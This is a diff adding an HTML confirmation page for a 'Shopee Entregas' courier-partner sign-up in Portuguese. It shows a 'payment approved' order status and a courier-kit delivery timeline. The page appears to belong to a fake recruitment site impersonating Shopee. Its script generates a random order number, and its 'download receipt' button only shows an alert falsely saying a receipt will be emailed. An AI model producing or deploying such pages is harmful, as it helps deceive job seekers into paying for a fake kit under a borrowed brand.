@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Finalização - Shopee Entregas</title>
+  <style>
+    :root {
+      --primary-color: #ee4d2d;
+      --primary-dark: #d03a1b;
+      --secondary-color: #0066cc;
+      --success-color: #28a745;
+      --text-color: #333;
+      --light-bg: #f8f9fa;
+      --border-radius: 8px;
+      --card-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      --transition: all 0.3s ease;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      line-height: 1.6;
+      color: var(--text-color);
+      background-color: var(--light-bg);
+    }
+    
+    header {
+      background-color: var(--primary-color);
+      padding: 1.5rem 1rem;
+      color: white;
+      text-align: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    header h1 {
+      margin: 0;
+      font-size: 1.8rem;
+    }
+    
+    header p {
+      margin: 0.25rem 0 0;
+      font-size: 1rem;
+      opacity: 0.9;
+    }
+    
+    main {
+      max-width: 800px;
+      margin: 2rem auto;
+      padding: 1rem;
+    }
+    
+    .breadcrumb {
+      display: flex;
+      margin-bottom: 1.5rem;
+      font-size: 0.9rem;
+    }
+    
+    .breadcrumb a {
+      color: var(--secondary-color);
+      text-decoration: none;
+    }
+    
+    .breadcrumb span {
+      margin: 0 0.5rem;
+      color: #999;
+    }
+    
+    .container {
+      background-color: white;
+      border-radius: var(--border-radius);
+      padding: 2rem;
+      box-shadow: var(--card-shadow);
+    }
+    
+    .success-container {
+      text-align: center;
+      padding: 2rem 1rem;
+    }
+    
+    .success-icon {
+      display: block;
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 1.5rem;
+      border-radius: 50%;
+      background-color: var(--success-color);
+      color: white;
+      font-size: 40px;
+      line-height: 80px;
+      text-align: center;
+    }
+    
+    .success-title {
+      color: var(--success-color);
+      font-size: 1.8rem;
+      margin-bottom: 1rem;
+    }
+    
+    .success-message {
+      color: #666;
+      margin-bottom: 2rem;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    
+    .order-details {
+      background-color: var(--light-bg);
+      border-radius: var(--border-radius);
+      padding: 1.5rem;
+      max-width: 600px;
+      margin: 0 auto 2rem;
+      text-align: left;
+    }
+    
+    .order-details h3 {
+      margin-bottom: 1rem;
+      color: var(--primary-color);
+      font-size: 1.2rem;
+      text-align: center;
+    }
+    
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 0.7rem 0;
+      border-bottom: 1px solid #ddd;
+    }
+    
+    .detail-row:last-child {
+      border-bottom: none;
+    }
+    
+    .detail-label {
+      font-weight: bold;
+    }
+    
+    .timeline {
+      max-width: 600px;
+      margin: 0 auto 2rem;
+    }
+    
+    .timeline-title {
+      margin-bottom: 1.5rem;
+      text-align: center;
+      color: var(--primary-color);
+    }
+    
+    .timeline-container {
+      position: relative;
+      padding-left: 40px;
+    }
+    
+    .timeline-container::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      bottom: 0;
+      left: 10px;
+      width: 2px;
+      background-color: #ddd;
+    }
+    
+    .timeline-item {
+      position: relative;
+      margin-bottom: 1.5rem;
+    }
+    
+    .timeline-item::before {
+      content: '';
+      position: absolute;
+      left: -30px;
+      top: 4px;
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      background-color: white;
+      border: 2px solid var(--primary-color);
+    }
+    
+    .timeline-item.active::before {
+      background-color: var(--primary-color);
+    }
+    
+    .timeline-item.pending::before {
+      border-color: #aaa;
+    }
+    
+    .timeline-content {
+      padding: 0 1rem;
+    }
+    
+    .timeline-date {
+      font-size: 0.9rem;
+      color: #666;
+    }
+    
+    .timeline-title {
+      font-weight: bold;
+      margin: 0.2rem 0;
+    }
+    
+    .timeline-desc {
+      color: #666;
+      font-size: 0.95rem;
+    }
+    
+    .next-steps {
+      margin-top: 3rem;
+    }
+    
+    .next-steps-title {
+      text-align: center;
+      margin-bottom: 1.5rem;
+      color: var(--primary-color);
+    }
+    
+    .steps-container {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 2rem;
+    }
+    
+    .step-card {
+      flex: 1;
+      min-width: 250px;
+      max-width: 300px;
+      background-color: white;
+      border-radius: var(--border-radius);
+      padding: 1.5rem;
+      box-shadow: var(--card-shadow);
+      text-align: center;
+    }
+    
+    .step-number {
+      display: inline-block;
+      width: 40px;
+      height: 40px;
+      line-height: 40px;
+      border-radius: 50%;
+      background-color: var(--primary-color);
+      color: white;
+      font-weight: bold;
+      margin-bottom: 1rem;
+    }
+    
+    .step-title {
+      font-weight: bold;
+      margin-bottom: 0.7rem;
+      color: var(--primary-color);
+    }
+    
+    .step-desc {
+      color: #666;
+      font-size: 0.95rem;
+    }
+    
+    .buttons-container {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin-top: 2rem;
+    }
+    
+    .btn {
+      padding: 0.8rem 1.5rem;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: var(--transition);
+      font-size: 1rem;
+      text-decoration: none;
+    }
+    
+    .btn-primary {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: var(--primary-dark);
+    }
+    
+    .btn-secondary {
+      background-color: #f1f1f1;
+      border: none;
+      color: #333;
+    }
+    
+    .btn-secondary:hover {
+      background-color: #e1e1e1;
+    }
+    
+    footer {
+      background-color: #333;
+      color: white;
+      padding: 2rem 1rem;
+      text-align: center;
+      margin-top: 3rem;
+    }
+    
+    footer p {
+      margin-bottom: 1rem;
+    }
+    
+    .footer-links {
+      margin-bottom: 1rem;
+    }
+    
+    .footer-links a {
+      color: #ddd;
+      margin: 0 0.5rem;
+      text-decoration: none;
+    }
+    
+    .footer-links a:hover {
+      color: white;
+      text-decoration: underline;
+    }
+    
+    @media (max-width: 768px) {
+      .steps-container {
+        flex-direction: column;
+        align-items: center;
+      }
+      
+      .step-card {
+        width: 100%;
+      }
+      
+      .buttons-container {
+        flex-direction: column;
+      }
+      
+      .btn {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Shopee Entregas</h1>
+    <p>Portal do Entregador Parceiro</p>
+  </header>
+  
+  <main>
+    <div class="breadcrumb">
+      <a href="/">Home</a>
+      <span>/</span>
+      <a href="/cadastro">Cadastro</a>
+      <span>/</span>
+      <a href="/municipios">Municípios</a>
+      <span>/</span>
+      <a href="/recebedor">Dados de Pagamento</a>
+      <span>/</span>
+      <a href="/entrega">Entrega do Kit</a>
+      <span>/</span>
+      <strong>Finalização</strong>
+    </div>
+    
+    <div class="container">
+      <div class="success-container">
+        <div class="success-icon">✓</div>
+        <h2 class="success-title">Cadastro Finalizado com Sucesso!</h2>
+        <p class="success-message">
+          Parabéns! Seu cadastro como entregador parceiro Shopee foi concluído com sucesso.
+          Estamos muito felizes em ter você em nossa equipe de entregadores.
+        </p>
+      </div>
+      
+      <div class="order-details">
+        <h3>Detalhes do Pedido</h3>
+        
+        <div class="detail-row">
+          <div class="detail-label">Número do Pedido:</div>
+          <div class="detail-value" id="order-number">SHP12345678</div>
+        </div>
+        
+        <div class="detail-row">
+          <div class="detail-label">Data:</div>
+          <div class="detail-value" id="order-date">22/04/2025</div>
+        </div>
+        
+        <div class="detail-row">
+          <div class="detail-label">Status do Pagamento:</div>
+          <div class="detail-value" id="payment-status">Aprovado</div>
+        </div>
+        
+        <div class="detail-row">
+          <div class="detail-label">Entrega:</div>
+          <div class="detail-value" id="delivery-type">Entrega Padrão</div>
+        </div>
+        
+        <div class="detail-row">
+          <div class="detail-label">Previsão de Entrega:</div>
+          <div class="detail-value" id="delivery-date">03/05/2025</div>
+        </div>
+      </div>
+      
+      <div class="timeline">
+        <h3 class="timeline-title">Acompanhe seu Pedido</h3>
+        
+        <div class="timeline-container">
+          <div class="timeline-item active">
+            <div class="timeline-content">
+              <div class="timeline-date">22/04/2025 - 14:30</div>
+              <h4 class="timeline-title">Pedido Confirmado</h4>
+              <p class="timeline-desc">Seu pedido foi confirmado e está sendo processado.</p>
+            </div>
+          </div>
+          
+          <div class="timeline-item active">
+            <div class="timeline-content">
+              <div class="timeline-date">22/04/2025 - 14:32</div>
+              <h4 class="timeline-title">Pagamento Aprovado</h4>
+              <p class="timeline-desc">O pagamento do seu pedido foi aprovado.</p>
+            </div>
+          </div>
+          
+          <div class="timeline-item pending">
+            <div class="timeline-content">
+              <div class="timeline-date">-</div>
+              <h4 class="timeline-title">Preparando para Envio</h4>
+              <p class="timeline-desc">Seu kit de entregador está sendo preparado para envio.</p>
+            </div>
+          </div>
+          
+          <div class="timeline-item pending">
+            <div class="timeline-content">
+              <div class="timeline-date">-</div>
+              <h4 class="timeline-title">Em Trânsito</h4>
+              <p class="timeline-desc">Seu kit está a caminho do seu endereço.</p>
+            </div>
+          </div>
+          
+          <div class="timeline-item pending">
+            <div class="timeline-content">
+              <div class="timeline-date">-</div>
+              <h4 class="timeline-title">Entregue</h4>
+              <p class="timeline-desc">Seu kit foi entregue no endereço informado.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="next-steps">
+        <h3 class="next-steps-title">Próximos Passos</h3>
+        
+        <div class="steps-container">
+          <div class="step-card">
+            <div class="step-number">1</div>
+            <h4 class="step-title">Receba seu Kit</h4>
+            <p class="step-desc">Seu kit de entregador será entregue no endereço fornecido nos próximos dias.</p>
+          </div>
+          
+          <div class="step-card">
+            <div class="step-number">2</div>
+            <h4 class="step-title">Acesse o Aplicativo</h4>
+            <p class="step-desc">Faça o download do aplicativo de entregas e faça login com seu CPF.</p>
+          </div>
+          
+          <div class="step-card">
+            <div class="step-number">3</div>
+            <h4 class="step-title">Comece a Entregar</h4>
+            <p class="step-desc">Ative seu modo disponível no aplicativo e comece a receber entregas.</p>
+          </div>
+        </div>
+      </div>
+      
+      <div class="buttons-container">
+        <a href="/finalizacao" class="btn btn-secondary" id="btn-download-receipt">Baixar Comprovante</a>
+        <a href="/" class="btn btn-primary">Voltar para a Home</a>
+      </div>
+    </div>
+  </main>
+  
+  <footer>
+    <p>&copy; 2025 Shopee Entregas. Todos os direitos reservados.</p>
+    <div class="footer-links">
+      <a href="#">Termos de Uso</a>
+      <a href="#">Política de Privacidade</a>
+      <a href="#">Contato</a>
+    </div>
+  </footer>
+
+  <script>
+    // Elementos do DOM
+    const orderNumber = document.getElementById('order-number');
+    const orderDate = document.getElementById('order-date');
+    const paymentStatus = document.getElementById('payment-status');
+    const deliveryType = document.getElementById('delivery-type');
+    const deliveryDate = document.getElementById('delivery-date');
+    const btnDownloadReceipt = document.getElementById('btn-download-receipt');
+    
+    // Gerar número de pedido aleatório
+    function generateOrderNumber() {
+      const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+      const prefix = 'SHP';
+      let number = '';
+      
+      // Adicionar 2 letras aleatórias
+      for (let i = 0; i < 2; i++) {
+        number += letters.charAt(Math.floor(Math.random() * letters.length));
+      }
+      
+      // Adicionar 6 números aleatórios
+      for (let i = 0; i < 6; i++) {
+        number += Math.floor(Math.random() * 10);
+      }
+      
+      return prefix + number;
+    }
+    
+    // Formatar data
+    function formatDate(date) {
+      return date.toLocaleDateString('pt-BR');
+    }
+    
+    // Simular download do comprovante
+    btnDownloadReceipt.addEventListener('click', (e) => {
+      e.preventDefault();
+      alert('O comprovante será enviado para o seu e-mail em alguns instantes.');
+    });
+    
+    // Inicializar página
+    document.addEventListener('DOMContentLoaded', () => {
+      // Gerar número de pedido
+      orderNumber.textContent = generateOrderNumber();
+      
+      // Data atual
+      const today = new Date();
+      orderDate.textContent = formatDate(today);
+      
+      // Obter método de entrega
+      const addressData = localStorage.getItem('addressData');
+      if (addressData) {
+        const address = JSON.parse(addressData);
+        
+        if (address.metodoEntrega === 'express') {
+          deliveryType.textContent = 'Entrega Expressa';
+          
+          // Data de entrega expressa (hoje + 3 dias úteis)
+          const deliveryDays = 3;
+          const deliveryDateObj = new Date(today);
+          let daysAdded = 0;
+          
+          while (daysAdded < deliveryDays) {
+            deliveryDateObj.setDate(deliveryDateObj.getDate() + 1);
+            
+            // Pular finais de semana
+            const dayOfWeek = deliveryDateObj.getDay();
+            if (dayOfWeek !== 0 && dayOfWeek !== 6) {
+              daysAdded++;
+            }
+          }
+          
+          deliveryDate.textContent = formatDate(deliveryDateObj);
+        } else {
+          deliveryType.textContent = 'Entrega Padrão';
+          
+          // Data de entrega padrão (hoje + 10 dias úteis)
+          const deliveryDays = 10;
+          const deliveryDateObj = new Date(today);
+          let daysAdded = 0;
+          
+          while (daysAdded < deliveryDays) {
+            deliveryDateObj.setDate(deliveryDateObj.getDate() + 1);
+            
+            // Pular finais de semana
+            const dayOfWeek = deliveryDateObj.getDay();
+            if (dayOfWeek !== 0 && dayOfWeek !== 6) {
+              daysAdded++;
+            }
+          }
+          
+          deliveryDate.textContent = formatDate(deliveryDateObj);
+        }
+      }
+    });
+  </script>
+</body>
+</html>
